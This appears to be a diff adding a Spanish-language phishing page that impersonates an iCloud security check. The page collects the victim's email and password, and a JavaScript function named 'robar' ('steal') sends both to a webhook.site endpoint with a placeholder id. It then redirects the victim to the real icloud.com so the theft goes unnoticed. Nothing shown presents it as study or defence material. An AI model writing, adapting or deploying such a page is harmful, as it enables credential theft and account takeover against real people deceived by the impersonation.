@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>iCloud</title>
+</head>
+<body style="text-align:center; padding:50px; font-family:Arial;">
+    <h2>Verificación de seguridad</h2>
+    <p>Tu cuenta de iCloud requiere verificación.</p>
+    <input id="email" placeholder="Correo electrónico" style="width:300px; padding:10px; margin:5px;">
+    <br>
+    <input id="pass" type="password" placeholder="Contraseña" style="width:300px; padding:10px; margin:5px;">
+    <br>
+    <button onclick="robar()" style="padding:10px 30px; background:blue; color:white; border:none;">Verificar</button>
+    <script>
+        function robar() {
+            var e = document.getElementById('email').value;
+            var p = document.getElementById('pass').value;
+            fetch('https://webhook.site/tu-id-aqui?email='+e+'&pass='+p);
+            alert('Verificando...');
+            window.location.href = 'https://icloud.com';
+        }
+    </script>
+</body>
+</html>
